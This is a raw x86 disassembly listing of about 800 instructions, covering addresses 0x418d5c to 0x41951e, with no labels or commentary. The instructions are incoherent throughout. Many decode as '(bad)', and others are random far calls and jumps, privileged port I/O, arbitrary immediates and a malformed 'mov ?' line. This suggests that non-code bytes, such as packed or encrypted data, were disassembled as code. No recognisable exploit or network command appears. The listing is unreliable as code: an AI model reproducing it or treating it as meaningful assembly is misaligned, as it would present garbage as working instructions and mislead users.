  418d5c:	popf   
  418d5d:	cmp    BYTE PTR [edx],bh
  418d5f:	call   0x7606:0x665b6946
  418d66:	push   ebp
  418d67:	(bad)  
  418d68:	mov    dh,0xcd
  418d6a:	retf   0xd232
  418d6d:	loop   0x418dad
  418d6f:	pop    edi
  418d70:	pop    esp
  418d71:	push   edx
  418d72:	(bad)  
  418d74:	imul   ebp,DWORD PTR [edi],0xffffff8a
  418d77:	inc    esp
  418d78:	sbb    al,0x9
  418d7a:	pop    edi
  418d7b:	vxorps xmm6,xmm4,XMMWORD PTR [eax+0x2393c2d1]
  418d83:	mov    eax,0x16659f9b
  418d88:	mov    cl,0xa0
  418d8a:	idiv   ch
  418d8c:	aad    0xcf
  418d8e:	retf   
  418d8f:	imul   eax,DWORD PTR [edx+0x6164385],0x8fd8b013
  418d99:	je     0x418e12
  418d9b:	sbb    edi,DWORD PTR [esi+0x53]
  418d9e:	cmc    
  418d9f:	fs aam 0xe4
  418da2:	mov    eax,ebp
  418da4:	xchg   DWORD PTR [ebx+ebx*8],ebx
  418da7:	outs   dx,BYTE PTR ds:[esi]
  418da8:	adc    DWORD PTR ds:0x8ba9bb12,0x6
  418daf:	retf   0x588e
  418db2:	out    dx,al
  418db3:	aad    0x26
  418db5:	and    esi,DWORD PTR [edx+edi*2+0x76a2d59d]
  418dbc:	fwait
  418dbd:	call   0x6fe94d5
  418dc2:	sbb    eax,edi
  418dc4:	cmp    esi,eax
  418dc6:	test   al,0xf3
  418dc8:	mov    al,0xe1
  418dca:	lock and al,0x8f
  418dcd:	jmp    0x418e14
  418dcf:	retf   0x1a4e
  418dd2:	push   es
  418dd3:	jg     0x418dc9
  418dd5:	pop    eax
  418dd6:	lods   eax,DWORD PTR ss:[esi]
  418dd8:	ror    bl,cl
  418dda:	ret    0x2c4c
  418ddd:	or     eax,0x4268f83
  418de2:	inc    cl
  418de4:	fmul   st(5),st
  418de6:	push   es
  418de7:	ficomp DWORD PTR [ebx+edx*8]
  418dea:	repz leave 
  418dec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418ded:	bound  eax,QWORD PTR [edi]
  418def:	loopne 0x418da9
  418df1:	aaa    
  418df2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418df3:	in     eax,0xde
  418df5:	pop    esp
  418df6:	pop    ss
  418df7:	mov    ah,0xbe
  418df9:	sub    ebx,ecx
  418dfb:	and    esi,DWORD PTR [edx]
  418dfd:	inc    esp
  418dfe:	push   edi
  418dff:	fs mov bh,0xd9
  418e02:	add    bl,dl
  418e04:	scas   eax,DWORD PTR es:[edi]
  418e05:	inc    esi
  418e06:	pop    edi
  418e07:	stos   BYTE PTR es:[edi],al
  418e08:	cld    
  418e09:	sbb    eax,0xe80d2d3e
  418e0e:	int3   
  418e0f:	cmp    al,BYTE PTR [ecx-0x29725b1f]
  418e15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418e16:	xchg   ebx,eax
  418e17:	push   0xffffffed
  418e19:	fidiv  WORD PTR [edx]
  418e1b:	test   eax,0x12f58ace
  418e20:	adc    dl,BYTE PTR [ebx]
  418e22:	bound  ebx,QWORD PTR [esi+0x63b758d7]
  418e28:	mov    al,ds:0x8864de5c
  418e2d:	out    dx,eax
  418e2e:	retf   
  418e2f:	pop    ebp
  418e30:	mov    al,ds:0x5f36ec9
  418e35:	adc    dh,dh
  418e37:	and    eax,0x95669cd5
  418e3c:	leave  
  418e3d:	and    eax,0xb3e40cf7
  418e42:	or     edi,edi
  418e44:	imul   ecx,DWORD PTR [edi],0x4325d6be
  418e4a:	shr    cl,1
  418e4c:	in     al,0x77
  418e4e:	retf   0xdf35
  418e51:	data16 mov ds:0xec4369c4,al
  418e57:	arpl   WORD PTR [edx-0x44],dx
  418e5a:	mov    fs,WORD PTR [ebp-0x5]
  418e5d:	xchg   ecx,eax
  418e5e:	mov    cl,BYTE PTR [ebx]
  418e60:	inc    eax
  418e61:	in     al,0x34
  418e63:	loopne 0x418e76
  418e65:	pop    edi
  418e66:	dec    ecx
  418e67:	mov    dh,0x9e
  418e69:	fst    DWORD PTR [ebp+0x7fc8393e]
  418e6f:	fisttp WORD PTR [ebp+edi*8+0x7fac8a94]
  418e76:	inc    esp
  418e77:	(bad)  
  418e78:	or     BYTE PTR [edi+0x12],bl
  418e7b:	mov    ebx,0xd3872401
  418e80:	jp     0x418e4a
  418e82:	jmp    0x418ebd
  418e84:	mov    ds:0x93678169,eax
  418e89:	js     0x418ec0
  418e8b:	sub    ebx,DWORD PTR [ecx-0x683b2d89]
  418e91:	aaa    
  418e92:	pop    edi
  418e93:	out    0xd4,al
  418e95:	clc    
  418e96:	les    ebx,FWORD PTR [eax]
  418e98:	outs   dx,DWORD PTR ds:[esi]
  418e99:	addr16 retf 
  418e9b:	push   ds
  418e9c:	ror    esi,1
  418e9e:	pop    eax
  418e9f:	jnp    0x418e63
  418ea1:	jp     0x418e51
  418ea3:	jg     0x418e87
  418ea5:	fwait
  418ea6:	jno    0x418ecb
  418ea8:	push   cs
  418ea9:	das    
  418eaa:	enter  0xaccb,0x2b
  418eae:	arpl   WORD PTR [ecx],ax
  418eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418eb1:	adc    esp,0xd36e2881
  418eb7:	add    al,0xec
  418eb9:	mov    ds:0x3c6702b6,eax
  418ebe:	xor    edi,DWORD PTR [esi+0x2ced2536]
  418ec4:	jmp    0x418e4e
  418ec6:	dec    edi
  418ec7:	xor    dh,BYTE PTR [esi]
  418ec9:	sti    
  418eca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ecb:	add    BYTE PTR [edi],0x6b
  418ece:	dec    esi
  418ecf:	js     0x418ef7
  418ed1:	add    BYTE PTR ds:[ebp+0x1d8a6cd8],cl
  418ed8:	je     0x418eeb
  418eda:	pop    edi
  418edb:	mov    ecx,0x4b12c311
  418ee0:	mov    ds:0x2c8ae388,al
  418ee5:	pop    ecx
  418ee6:	push   esi
  418ee7:	jmp    0xf36a:0x44a109a8
  418eee:	inc    esp
  418eef:	mov    BYTE PTR [ecx+0x2f3664d3],cl
  418ef5:	xor    al,0x8d
  418ef7:	scas   eax,DWORD PTR es:[edi]
  418ef8:	stos   DWORD PTR es:[edi],eax
  418ef9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418efa:	mov    dh,BYTE PTR [edx-0x367b1067]
  418f00:	loope  0x418eec
  418f02:	mov    esi,0xb4bf6d81
  418f07:	push   eax
  418f08:	cmc    
  418f09:	inc    edi
  418f0a:	addr16 add al,0xbc
  418f0d:	daa    
  418f0e:	outs   dx,DWORD PTR es:[esi]
  418f10:	push   ebx
  418f11:	xchg   ebx,eax
  418f12:	fidivr WORD PTR [ebx+ebx*1+0x38]
  418f16:	mov    ds:0xb173ff4d,eax
  418f1b:	repz stc 
  418f1d:	push   ecx
  418f1e:	jbe    0x418f6a
  418f20:	(bad)  
  418f21:	int    0xc2
  418f23:	shl    dl,cl
  418f25:	inc    eax
  418f26:	mov    dl,0xe7
  418f28:	fld    TBYTE PTR [edi-0x5c3cf294]
  418f2e:	shl    BYTE PTR [esi-0x54],cl
  418f31:	stos   DWORD PTR es:[edi],eax
  418f32:	mov    cl,0xd3
  418f34:	inc    esi
  418f35:	std    
  418f36:	mov    al,ds:0x14ae2e55
  418f3b:	jp     0x418f5a
  418f3d:	mov    eax,DWORD PTR [eax+ebp*8]
  418f40:	lods   eax,DWORD PTR ds:[esi]
  418f41:	dec    edx
  418f42:	inc    ebp
  418f43:	push   esp
  418f44:	add    bl,BYTE PTR [edi+0x4186a655]
  418f4a:	inc    ecx
  418f4b:	fst    QWORD PTR [edx-0x4418cf2c]
  418f51:	inc    ecx
  418f52:	xchg   esp,eax
  418f53:	and    ebp,ebp
  418f55:	loopne 0x418f6f
  418f57:	sbb    DWORD PTR ds:0x9578f388,0xdfee021
  418f61:	sbb    ebx,esp
  418f63:	mov    dh,0xdf
  418f65:	add    eax,esp
  418f67:	in     eax,0xe9
  418f69:	lock inc eax
  418f6b:	or     esi,0x86e44efa
  418f71:	cwde   
  418f72:	or     eax,0x1a6f8f6d
  418f77:	mov    ?,WORD PTR [edi+ebx*4]
  418f7a:	dec    edi
  418f7b:	iret   
  418f7c:	sbb    ebp,DWORD PTR [edx]
  418f7e:	outs   dx,DWORD PTR ds:[esi]
  418f7f:	adc    ch,BYTE PTR [edi-0x27]
  418f82:	push   edx
  418f83:	adc    edi,esp
  418f85:	lods   eax,DWORD PTR ds:[esi]
  418f86:	mov    ebx,0xdc3d2136
  418f8b:	sbb    esi,esi
  418f8d:	push   0xdebd0690
  418f92:	imul   ebx,edx,0x4dbfda45
  418f98:	push   ss
  418f99:	jnp    0x418f4e
  418f9b:	jo     0x418fda
  418f9d:	xor    esp,DWORD PTR ds:0x9c9fdf53
  418fa3:	jge    0x418fdd
  418fa5:	repnz shr BYTE PTR [ebp+0x5f],cl
  418fa9:	jnp    0x418ff1
  418fab:	(bad)  
  418fac:	and    al,0x23
  418fae:	dec    ebx
  418faf:	sbb    ebx,DWORD PTR [eax]
  418fb1:	push   ecx
  418fb2:	dec    ecx
  418fb3:	sti    
  418fb4:	jmp    0x419029
  418fb6:	imul   esi,DWORD PTR [esi+edx*4+0x1],0xb133736e
  418fbe:	mov    BYTE PTR [esi],ah
  418fc0:	sti    
  418fc1:	(bad)  
  418fc2:	or     bh,BYTE PTR [ebx-0x2c]
  418fc5:	mov    al,ds:0xb73a3c66
  418fca:	inc    edi
  418fcb:	ins    DWORD PTR es:[edi],dx
  418fcc:	jo     0x41900a
  418fce:	and    edx,edi
  418fd0:	xchg   esi,eax
  418fd1:	xchg   dh,cl
  418fd3:	xor    bl,BYTE PTR [edi]
  418fd5:	sub    bh,0x43
  418fd8:	jnp    0x41900e
  418fda:	pop    ss
  418fdb:	stos   BYTE PTR es:[edi],al
  418fdc:	inc    ebx
  418fdd:	dec    eax
  418fde:	jb     0x418fe1
  418fe0:	jg     0x418f73
  418fe2:	pop    es
  418fe3:	xchg   ebp,ebp
  418fe5:	ss into 
  418fe7:	into   
  418fe8:	cld    
  418fe9:	inc    esi
  418fea:	mov    ebp,0x33107438
  418fef:	(bad)  
  418ff0:	push   0xc164d17b
  418ff5:	bound  edi,QWORD PTR [eax]
  418ff7:	fucom  st(6)
  418ff9:	push   ds
  418ffa:	sbb    ah,0xc2
  418ffd:	retf   0xcfe7
  419000:	imul   ebp,DWORD PTR [ebx-0x7e],0xb63f3e82
  419007:	mov    ah,0xbe
  419009:	push   ebp
  41900a:	or     ebp,DWORD PTR [ebp-0x51]
  41900d:	cmp    al,0x1
  41900f:	pop    ss
  419010:	sub    DWORD PTR [eax+0x5a],ecx
  419013:	lds    esp,FWORD PTR [ecx+esi*2+0x3240492b]
  41901a:	sbb    DWORD PTR [edx],ebx
  41901c:	js     0x41902d
  41901e:	dec    edi
  41901f:	mov    BYTE PTR [ecx],0x80
  419022:	cmp    BYTE PTR [esi],0xa7
  419025:	inc    esi
  419026:	or     cl,BYTE PTR [ecx+0x78]
  419029:	pushf  
  41902a:	out    dx,al
  41902b:	out    dx,al
  41902c:	jp     0x41905d
  41902e:	pop    ecx
  41902f:	test   eax,0xc40c085f
  419034:	push   esp
  419035:	inc    edi
  419036:	mov    dh,0x76
  419038:	jae    0x418ffc
  41903a:	sbb    dh,BYTE PTR [ecx+0xbd62041]
  419040:	rcr    DWORD PTR [esi-0x14],1
  419043:	mov    cl,0x8
  419045:	test   BYTE PTR [ecx],dl
  419047:	mov    ch,0xea
  419049:	xor    dl,bh
  41904b:	and    DWORD PTR [edi+ecx*1-0x384fd170],eax
  419052:	(bad)  [ebx+edx*1+0x57288e22]
  419059:	ins    DWORD PTR es:[edi],dx
  41905a:	shr    BYTE PTR [edx+edi*2+0x14ee82ff],1
  419061:	dec    eax
  419062:	sub    ebx,ebp
  419064:	push   ebp
  419065:	push   es
  419066:	push   ss
  419067:	xor    bh,al
  419069:	(bad)  
  41906a:	in     eax,0x30
  41906c:	cmp    BYTE PTR [edi+0x2e],0x90
  419070:	pop    ss
  419071:	repnz (bad) 
  419073:	push   cs
  419074:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419075:	mov    ah,0x8f
  419077:	pop    ecx
  419078:	pop    ss
  419079:	sbb    al,0x81
  41907c:	cmp    dl,BYTE PTR [edx]
  41907e:	xchg   ecx,eax
  41907f:	pushf  
  419080:	adc    DWORD PTR [edx+0x2],0x3f
  419084:	push   ebp
  419085:	fcomp  st(4)
  419087:	inc    esi
  419088:	add    eax,0x94475f63
  41908d:	push   esp
  41908e:	adc    bx,WORD PTR ds:0x6db8af5a
  419095:	je     0x4190d2
  419097:	sub    ecx,ebp
  419099:	xchg   ebx,eax
  41909a:	jge    0x41904c
  41909c:	or     ch,dl
  41909e:	call   FWORD PTR [ebx]
  4190a0:	mov    dl,BYTE PTR [ebx+0x6d]
  4190a3:	cdq    
  4190a4:	dec    edx
  4190a5:	loopne 0x4190b6
  4190a7:	pop    edx
  4190a8:	xchg   ebp,eax
  4190a9:	pop    ecx
  4190aa:	mov    esi,0x5b36f9ae
  4190af:	jne    0x4190a4
  4190b1:	inc    ecx
  4190b2:	js     0x4190fc
  4190b4:	fwait
  4190b5:	ret    0xbf5f
  4190b8:	adc    BYTE PTR [ebp-0x34c8c140],ch
  4190be:	and    ecx,DWORD PTR es:[ecx+0xd]
  4190c2:	dec    esi
  4190c3:	mov    bh,0xf0
  4190c5:	call   0xcd16:0xe6fc0a11
  4190cc:	test   ah,0x21
  4190cf:	mov    dh,BYTE PTR ds:0x45a1d2b
  4190d5:	sbb    eax,0x36955f71
  4190da:	push   ecx
  4190db:	inc    esi
  4190dc:	ret    0x3eb9
  4190df:	mov    ebp,0xf7f89322
  4190e4:	mov    gs,WORD PTR [eax-0x75925efa]
  4190ea:	or     dl,BYTE PTR [ebx+edi*2]
  4190ed:	pop    ss
  4190ee:	sbb    al,0x86
  4190f0:	cmp    ecx,eax
  4190f2:	clc    
  4190f3:	(bad)
  4190f6:	fwait
  4190f7:	in     al,0x7b
  4190f9:	loope  0x41908a
  4190fb:	or     DWORD PTR [eax],esp
  4190fd:	rcr    DWORD PTR [ecx+0x4d250274],cl
  419103:	jb     0x419085
  419105:	mov    ds:0x397b57ae,eax
  41910a:	lds    esp,FWORD PTR [edi]
  41910c:	add    edi,DWORD PTR [eax+0x64]
  41910f:	inc    ebx
  419110:	out    0x9d,al
  419112:	mov    cl,0x86
  419114:	sbb    DWORD PTR [edi+0x48],edx
  419117:	jns    0x419197
  419119:	pusha  
  41911a:	fdivr  st,st(4)
  41911c:	dec    ebp
  41911d:	cld    
  41911e:	std    
  41911f:	pop    esp
  419120:	out    0xb2,eax
  419122:	es ins BYTE PTR es:[edi],dx
  419124:	mov    edx,0x2123ed29
  419129:	inc    esi
  41912a:	mov    bh,0xd9
  41912c:	test   al,0xc4
  41912e:	inc    eax
  41912f:	(bad)  
  419130:	lods   al,BYTE PTR ds:[esi]
  419131:	out    0xaa,eax
  419133:	or     cl,BYTE PTR [ebx]
  419135:	lock (bad) 
  419137:	xor    bl,BYTE PTR [edx-0x2ac7cbff]
  41913d:	mov    dh,0x80
  41913f:	mov    dh,0xab
  419141:	stc    
  419142:	jmp    0xcc43:0x777be597
  419149:	(bad)  [ecx-0x86818fc]
  41914f:	(bad)  
  419150:	ficom  DWORD PTR [edi+0x33]
  419153:	ret    0xfaf2
  419156:	lds    ecx,FWORD PTR [esi+esi*1+0x305166f1]
  41915d:	hlt    
  41915e:	cld    
  41915f:	test   al,0xa1
  419161:	adc    esi,DWORD PTR [edi+edx*2+0x43cf73bd]
  419168:	dec    ecx
  419169:	pop    ebx
  41916a:	int    0x0
  41916c:	mov    ch,0x89
  41916e:	loope  0x41917c
  419170:	sbb    ebx,DWORD PTR [esi]
  419172:	pop    edx
  419173:	das    
  419174:	mov    edx,0xbdee79d4
  419179:	test   ebx,eax
  41917b:	fdivr  DWORD PTR [ecx-0x6c36f7ef]
  419181:	jno    0x4191db
  419183:	jmp    DWORD PTR [ecx-0x52]
  419186:	mov    DWORD PTR [edx+0x63],edx
  419189:	mov    ecx,DWORD PTR [edx+0x6e]
  41918c:	lock jbe 0x41918e
  41918f:	push   eax
  419190:	xchg   DWORD PTR [edx+0xb4b44f9],esp
  419196:	sub    DWORD PTR [eax-0xb],0xffffffcf
  41919a:	sub    DWORD PTR [ebx+0x77904886],edx
  4191a0:	xchg   ebx,eax
  4191a1:	scas   al,BYTE PTR es:[edi]
  4191a2:	cmp    BYTE PTR [eax-0x592b2542],ch
  4191a8:	and    ebp,ebp
  4191aa:	in     eax,dx
  4191ab:	mov    ecx,0xb954af4
  4191b0:	pop    eax
  4191b1:	mov    cl,0xe6
  4191b3:	sub    eax,0xc61fb8c4
  4191b8:	je     0x419171
  4191ba:	or     al,0x70
  4191bc:	fst    DWORD PTR [ebp-0x24c2551b]
  4191c2:	or     al,0xad
  4191c4:	inc    esi
  4191c5:	mov    ebx,0x175a389
  4191ca:	jge    0x41918a
  4191cc:	ret    0x6273
  4191cf:	rcr    DWORD PTR [edi-0x29],0x85
  4191d3:	lock xor al,0x7d
  4191d6:	xor    al,0x46
  4191d8:	aas    
  4191d9:	pop    esp
  4191da:	mov    bl,0x12
  4191dc:	sub    al,0xb2
  4191de:	adc    al,0x4
  4191e0:	test   eax,0xf3eec361
  4191e5:	clc    
  4191e6:	sbb    edx,DWORD PTR [edi]
  4191e8:	jg     0x419207
  4191ea:	adc    DWORD PTR [edx+0x43],edi
  4191ed:	inc    eax
  4191ee:	jns    0x419252
  4191f0:	adc    ch,bh
  4191f2:	add    cl,BYTE PTR [edx-0x64]
  4191f5:	(bad)  
  4191f6:	jmp    0x58e6967d
  4191fb:	cs hlt 
  4191fd:	cmc    
  4191fe:	inc    edi
  4191ff:	call   0x7218:0xbbf6bcbc
  419206:	dec    eax
  419207:	inc    edi
  419208:	adc    bl,0x2d
  41920b:	and    DWORD PTR [ebx-0x52],edx
  41920e:	aas    
  41920f:	inc    edi
  419210:	(bad)  [ebp-0x237fd459]
  419216:	xchg   ebp,eax
  419217:	adc    al,0xf6
  419219:	scas   al,BYTE PTR es:[edi]
  41921a:	sbb    DWORD PTR [ecx-0x5f056854],0xffffffd2
  419221:	leave  
  419222:	jge    0x41929c
  419224:	adc    BYTE PTR [edx],ah
  419226:	sbb    eax,DWORD PTR [esi]
  419228:	loopne 0x419292
  41922a:	cmp    cl,bl
  41922c:	xchg   esp,edx
  41922e:	fnstsw WORD PTR [eax+0x751d9823]
  419234:	push   0x44
  419236:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419237:	adc    eax,DWORD PTR gs:[edx]
  41923a:	das    
  41923b:	je     0x4192b9
  41923d:	push   ss
  41923e:	xor    eax,0x11122ff1
  419243:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419244:	mov    edi,DWORD PTR [eax+0x4d1ca682]
  41924a:	add    eax,0x793fc08e
  41924f:	hlt    
  419250:	mov    DWORD PTR [ecx+0x52defab6],0xd35ad22d
  41925a:	and    edx,DWORD PTR [ecx+0x6627c431]
  419260:	mov    ds:0x4f8728d7,eax
  419265:	cmc    
  419266:	inc    ebx
  419267:	test   BYTE PTR [ebx],bl
  419269:	mov    ds:0x5531f5fc,eax
  41926e:	sar    edi,1
  419270:	lahf   
  419271:	sbb    bh,dl
  419273:	add    DWORD PTR [eax+esi*1+0x43],0x9be029b2
  41927b:	xchg   BYTE PTR [edi-0x7d8070a9],ch
  419281:	and    al,0x72
  419283:	test   al,0x60
  419285:	and    al,0x71
  419287:	cld    
  419288:	out    dx,eax
  419289:	outs   dx,DWORD PTR ds:[esi]
  41928a:	dec    edx
  41928b:	adc    bh,BYTE PTR [ebx-0x4e]
  41928e:	mov    ebx,0xfd56cdd3
  419293:	jae    0x4192fb
  419295:	adc    al,0xbe
  419297:	fucomp st(2)
  419299:	add    DWORD PTR [ecx-0x2edd689d],esp
  41929f:	dec    ebx
  4192a0:	lds    eax,FWORD PTR [eax-0x59]
  4192a3:	(bad)  
  4192a4:	(bad)  
  4192a5:	mov    eax,0x75521d7a
  4192aa:	push   edi
  4192ab:	outs   dx,BYTE PTR ds:[esi]
  4192ac:	pop    edx
  4192ad:	or     eax,0xa3bcb765
  4192b2:	lahf   
  4192b3:	fidivr DWORD PTR [ecx+0x56]
  4192b6:	loopne 0x419334
  4192b8:	cs adc esi,ecx
  4192bb:	loop   0x4192ce
  4192bd:	data16 xor cl,BYTE PTR [ecx+esi*4+0x7b]
  4192c2:	repz mov cl,0xb9
  4192c5:	pushf  
  4192c6:	js     0x41924e
  4192c8:	test   DWORD PTR [edx+0x772915c9],edi
  4192ce:	call   0xa7de:0xcb2c836
  4192d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192d6:	cmp    al,0xc6
  4192d8:	(bad)  
  4192d9:	xlat   BYTE PTR ds:[ebx]
  4192da:	int3   
  4192db:	mov    ebp,0xa9231746
  4192e0:	jg     0x4192d9
  4192e2:	nop
  4192e3:	adc    esi,0xffffff89
  4192e6:	jp     0x419315
  4192e8:	xor    edx,ecx
  4192ea:	inc    ecx
  4192eb:	lods   eax,DWORD PTR ds:[esi]
  4192ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192ed:	push   esp
  4192ee:	mov    ds:0xc2ec91be,al
  4192f3:	pushf  
  4192f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4192f5:	push   esp
  4192f6:	xchg   esi,eax
  4192f7:	jbe    0x4192e7
  4192f9:	rcr    DWORD PTR [esi],1
  4192fb:	xor    DWORD PTR [esi-0x22f87f14],0x3f
  419302:	imul   ebx,DWORD PTR [edi+0x40],0xffffffe5
  419306:	shr    DWORD PTR [eax],cl
  419308:	push   0xe784aa83
  41930d:	ins    BYTE PTR es:[edi],dx
  41930e:	xor    eax,0x9d86515a
  419313:	ja     0x41936e
  419315:	call   0x5610:0xce6d1657
  41931c:	lds    ecx,FWORD PTR [ebp-0x35eb55d4]
  419322:	mov    dl,0x23
  419324:	sbb    DWORD PTR cs:[ebx+ebx*4+0x64],ecx
  419329:	cmp    edi,DWORD PTR [ebx+0x16]
  41932c:	fldl2t 
  41932e:	push   esp
  41932f:	or     eax,0x411bc404
  419334:	clc    
  419335:	xor    al,0xc2
  419337:	aad    0xe2
  419339:	mov    dh,0x5
  41933b:	les    eax,FWORD PTR [edi-0x29]
  41933e:	pop    es
  41933f:	adc    eax,0x265abab3
  419344:	popa   
  419345:	and    BYTE PTR [eax+0x333bbb21],0x47
  41934c:	inc    ebp
  41934d:	loopne 0x419372
  41934f:	adc    ebp,DWORD PTR [esi+0x7792e59b]
  419355:	rcr    DWORD PTR [ebp+0x5aaddf99],1
  41935b:	in     al,0x86
  41935d:	push   esi
  41935e:	mov    WORD PTR [edx+0x3921c273],ss
  419364:	mov    DWORD PTR [esi],edi
  419366:	loopne 0x419315
  419368:	pop    es
  419369:	xchg   DWORD PTR [ebp+0x32a1dddf],esi
  41936f:	pushf  
  419370:	inc    ebp
  419371:	adc    ah,BYTE PTR [ebx]
  419373:	pushf  
  419374:	bound  ecx,QWORD PTR ds:0xd0f3ec5d
  41937a:	pop    edx
  41937b:	ja     0x419386
  41937d:	pop    edx
  41937e:	mov    edi,eax
  419380:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419381:	loopne 0x41931b
  419383:	stos   DWORD PTR es:[edi],eax
  419384:	pop    ds
  419385:	clc    
  419386:	jmp    0x1bdd:0x70628d30
  41938d:	or     DWORD PTR [ebx+0x5d],esi
  419390:	test   DWORD PTR [esi+0x63],eax
  419393:	xor    ah,cl
  419395:	pop    ebp
  419396:	test   al,0xc2
  419398:	bound  ecx,QWORD PTR [bp+0x2b6b]
  41939d:	int    0xe9
  41939f:	add    eax,0x200b0b6f
  4193a4:	pop    edi
  4193a5:	dec    ebx
  4193a6:	aaa    
  4193a7:	cmp    al,0x9a
  4193a9:	inc    ecx
  4193aa:	or     bl,ah
  4193ac:	mov    cl,BYTE PTR [eax+0x73445dc8]
  4193b2:	push   ecx
  4193b3:	icebp  
  4193b4:	mov    ds:0x12bdc1b5,eax
  4193b9:	sbb    bh,BYTE PTR [ebx+0x34]
  4193bc:	ss mov edi,gs
  4193bf:	mov    ecx,0x328a9701
  4193c4:	xlat   BYTE PTR ds:[ebx]
  4193c5:	and    edx,DWORD PTR [edi+0x16]
  4193c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4193c9:	pop    edi
  4193ca:	inc    edi
  4193cb:	add    ebx,DWORD PTR [ebp+0x6e1552ba]
  4193d1:	jne    0x419414
  4193d3:	sub    al,cl
  4193d5:	xchg   esi,eax
  4193d6:	cmp    ch,bh
  4193d8:	in     eax,0x75
  4193da:	lods   al,BYTE PTR ds:[esi]
  4193db:	int    0x79
  4193dd:	push   es
  4193de:	or     DWORD PTR [edi],0x67
  4193e1:	adc    eax,0x2c095d9a
  4193e6:	(bad)  
  4193e7:	fsubr  QWORD PTR [eax-0x1da1058b]
  4193ed:	stc    
  4193ee:	rcl    DWORD PTR [esi],1
  4193f0:	js     0x4193ba
  4193f2:	rol    edi,cl
  4193f4:	mov    WORD PTR [ecx+ecx*4],ss
  4193f7:	loop   0x419472
  4193f9:	lods   al,BYTE PTR ds:[esi]
  4193fa:	iret   
  4193fb:	inc    edi
  4193fc:	shl    DWORD PTR [ebx-0x18bd94c],1
  419402:	jbe    0x419409
  419404:	and    DWORD PTR [edx+0xd],edx
  419407:	or     al,0xf
  419409:	fdiv   st(5),st
  41940b:	stc    
  41940c:	cld    
  41940d:	shl    DWORD PTR [esi+0x4435f558],1
  419413:	loopne 0x41947c
  419415:	dec    edx
  419416:	mov    al,ds:0xab85e7f4
  41941b:	pop    ss
  41941c:	push   ds
  41941d:	or     al,0x81
  41941f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419420:	mov    esi,DWORD PTR [esi]
  419422:	push   esi
  419423:	mov    cl,0xc9
  419425:	shl    BYTE PTR [eax+ecx*4],1
  419428:	add    dl,BYTE PTR [ecx+0x56e9074c]
  41942e:	fmul   QWORD PTR [ecx-0x57876577]
  419434:	pop    ss
  419435:	mov    esp,0xe0ee23a6
  41943a:	inc    esp
  41943b:	les    ebp,FWORD PTR [esi-0x14c6b8e7]
  419441:	test   BYTE PTR [ebx],bh
  419443:	inc    esp
  419444:	ret    
  419445:	lock sbb ebp,ecx
  419448:	popf   
  419449:	cdq    
  41944a:	pop    ebp
  41944b:	pop    edx
  41944c:	xchg   esp,eax
  41944d:	or     eax,0x64ee7c02
  419453:	stos   BYTE PTR es:[edi],al
  419454:	ss in  al,0x21
  419457:	dec    eax
  419458:	les    esp,FWORD PTR [ecx-0x29]
  41945b:	jb     0x41944b
  41945d:	fcom   st(7)
  41945f:	lock bound esi,QWORD PTR [eax-0x6c]
  419463:	jo     0x41940d
  419465:	outs   dx,BYTE PTR ds:[esi]
  419466:	or     al,0xfe
  419468:	push   0x49
  41946a:	jo     0x419487
  41946c:	in     eax,dx
  41946d:	test   eax,0x19cae26e
  419472:	inc    esp
  419473:	cmp    DWORD PTR [edi+0x1e3a1583],esi
  419479:	jp     0x4194ca
  41947b:	out    0x3b,al
  41947d:	cwde   
  41947e:	pop    ecx
  41947f:	lds    edi,FWORD PTR [ebp-0x46]
  419482:	das    
  419483:	mov    ebp,0x3f4775af
  419488:	dec    ebx
  419489:	mov    ecx,0xd265ee0d
  41948e:	adc    eax,0x5a0a675d
  419493:	mov    al,ds:0x45e2cc0b
  419498:	lods   al,BYTE PTR ds:[esi]
  419499:	xchg   esp,eax
  41949a:	scas   al,BYTE PTR es:[edi]
  41949b:	xlat   BYTE PTR ds:[ebx]
  41949c:	push   eax
  41949d:	sbb    esp,esi
  41949f:	mov    ch,0x76
  4194a1:	pop    es
  4194a2:	sub    al,al
  4194a4:	pop    sp
  4194a6:	xchg   esi,eax
  4194a7:	neg    BYTE PTR [ecx-0x647b742f]
  4194ad:	mov    gs,WORD PTR [ebp-0x3647d2a7]
  4194b3:	push   eax
  4194b4:	pop    eax
  4194b5:	mov    ds:0x5ecdb7f1,al
  4194ba:	lahf   
  4194bb:	es xchg esi,eax
  4194bd:	imul   edx,DWORD PTR [ebp+0x5e1b736b],0xd9075fbc
  4194c7:	push   eax
  4194c8:	lods   eax,DWORD PTR ds:[esi]
  4194c9:	rcr    esp,0x37
  4194cc:	cmp    eax,0xa3851e29
  4194d1:	jns    0x4194a3
  4194d3:	fdivr  QWORD PTR [esi+edx*4]
  4194d6:	xchg   ecx,eax
  4194d7:	(bad)  
  4194d8:	sub    DWORD PTR [ebx-0x6033c380],esp
  4194de:	imul   ecx,ecx,0x3
  4194e1:	push   cs
  4194e2:	lahf   
  4194e3:	push   esp
  4194e4:	cs mov edi,0x3ec73a3
  4194ea:	rol    al,1
  4194ec:	xchg   DWORD PTR [ebp+0x15],esi
  4194ef:	cwde   
  4194f0:	lods   al,BYTE PTR ds:[esi]
  4194f1:	(bad)  
  4194f2:	shl    BYTE PTR [esi+eax*1+0x725b03c7],0xb7
  4194fa:	jae    0x419532
  4194fc:	fld    TBYTE PTR [edi-0x31436a35]
  419502:	cmp    eax,0x19d1918f
  419507:	push   ebp
  419508:	sub    BYTE PTR [edi+0x70],0xbd
  41950c:	(bad)  
  41950d:	inc    esp
  41950e:	ret    
  41950f:	fstp   TBYTE PTR [ecx-0x66]
  419512:	cmp    eax,0x4a16c81d
  419517:	leave  
  419518:	mov    gs,WORD PTR [esi+0x3f]
  41951b:	adc    BYTE PTR [edi-0xf],dh
  41951e:	pop    esi
